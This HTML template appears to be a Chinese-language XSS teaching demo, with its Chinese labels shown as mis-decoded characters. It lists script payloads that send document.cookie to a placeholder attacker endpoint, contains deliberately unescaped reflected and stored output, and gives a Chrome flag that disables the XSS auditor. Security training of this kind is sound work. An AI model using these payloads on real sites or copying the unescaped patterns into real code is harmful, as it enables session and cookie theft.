<!DOCTYPE HTML>
<html xmlns:th="http://www.thymeleaf.org">
<head>
    <title>Web å®‰å…¨æ¼”ç¤º - XSS</title>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <link rel="stylesheet" type="text/css" href="/webjars/bootstrap/3.3.7/css/bootstrap.min.css" />
    <script type="text/javascript" src="/webjars/jquery/2.2.4/jquery.min.js"></script>
</head>
<body>

    <div class="container">
        <h1>Web å®‰å…¨æ¼”ç¤º - XSS</h1>

        <h2>Example</h2>
        <ul>
            <li>&lt;script&gt;alert('Hello XSS!')&lt;/script&gt;</li>
            <li>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</li>
            <li>&lt;script&gt;%24.get%28%27<span th:text="${hackSite}"></span>%2Fxss%2Fsteal%27%2C+%7Bcookie%3A+document.cookie%7D%29&lt;/script&gt;</li>
            <li><span th:text="${site}"></span>/xss/search?searchKey=%3Cscript%3E%24.get%28%27<span th:text="${hackSite}"></span>%2Fxss%2Fsteal%27%2C+%7Bcookie%3A+document.cookie%7D%29%3C/script%3E</li>
            <li>&lt;script&gt;$.get('<span th:text="${hackSite}"></span>/xss/steal', {cookie: document.cookie})&lt;/script&gt;</li>
        </ul>

        <h2>éæŒä¹…å‹ XSS / åå°„æ€§ XSS</h2>

        <h3>æœåŠ¡ç«¯æ— å…³ï¼Œçº¯å®¢æˆ·ç«¯è¡Œä¸º</h3>
        <p>
        <input class="search_input" value="" /> <button class="btn-default search_btn">æ£€ç´¢</button>
        </p>
        <p class="search_box" style="display: none">
        è¿™é‡Œæ˜¯ <span class="search_key"></span> çš„æœç´¢å†…å®¹
        <br />
            bla..bla..bla..bla..bla..bla..
        </p>

        <hr />

        <h3>æœåŠ¡ç«¯ç›¸å…³ï¼Œä½†ä¸å­˜å‚¨</h3>
        <p>
            <input name="searchKey" class="search_input_1" th:value="${searchKey}" /> <button class="btn-default search_btn_1">æ£€ç´¢</button>
        </p>
        <p class="search_box_1">
            è¿™é‡Œæ˜¯ <span class="search_key_1" th:utext="${searchKey}"></span> çš„æœç´¢å†…å®¹
            <br />
            bla..bla..bla..bla..bla..bla..
        </p>

        <h2>æŒä¹…å‹ XSS</h2>
        <p>
            <input name="name" placeholder="è¯·è¾“å…¥æ‚¨çš„åå­—" class="user_input_name" th:value="${name}" /> <button class="btn-default btn-save">ä¿å­˜</button>
        </p>
        <p class="search_box_1" th:style="${name} ? '' : 'display: none'">
            Hello, <span th:utext="${name}"></span>ã€‚
            <br />
            bla..bla..bla..bla..bla..bla..
        </p>

        <h2>é£é™©</h2>
        <ul>
            <li>ğŸ’°ğŸ’°ğŸ’°ğŸ’° - æ¯å¹´è¯·å®‰å…¨å…¬å¸åšå…¨ç«™çš„å®‰å…¨æ£€æŸ¥ï¼Œä¸€ä¸ªç®€å•çš„çº¯å®¢æˆ·ç«¯ XSS = 1000</li>
            <li>å®‰å…¨é—®é¢˜ - ç›—å–ç”¨æˆ·ä¿¡æ¯ã€ä¼ªé€ ç”¨æˆ·èº«ä»½</li>
        </ul>

        <h2>Tools</h2>
        <ul>
            <li>REFERENCE: <a target="_blank" href="https://zoumiaojiang.com/article/common-web-security/">å¸¸è§ Web å®‰å…¨æ”»é˜²æ€»ç»“</a></li>
            <li>`/Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome --args --disable-xss-auditor` - é«˜ç‰ˆæœ¬çš„ Chrome ä¼šè‡ªåŠ¨è¯†åˆ« XSS æ”»å‡»ï¼Œå¹¶ç¦æ­¢ä½ çš„è®¿é—®</li>
        </ul>
    </div>

    <script type="text/javascript">
        $('button.search_btn').click(function() {
            if ($('input.search_input').val()) {
                $('span.search_key').html($('input.search_input').val());
                $('p.search_box').show();
            }
        });

        $('button.search_btn_1').click(function() {
            var searchKey = $('input.search_input_1').val();
            if (searchKey) {
                location.href = "/xss/search?searchKey=" + searchKey;
            }
        });

        $('button.btn-save').click(function() {
            var username = $('input.user_input_name').val();
            if (username) {
                $.post("/xss/save", {name: username}, function(data) {
                    location.href = "/xss";
                });
            }
        });
    </script>
</body>
</html>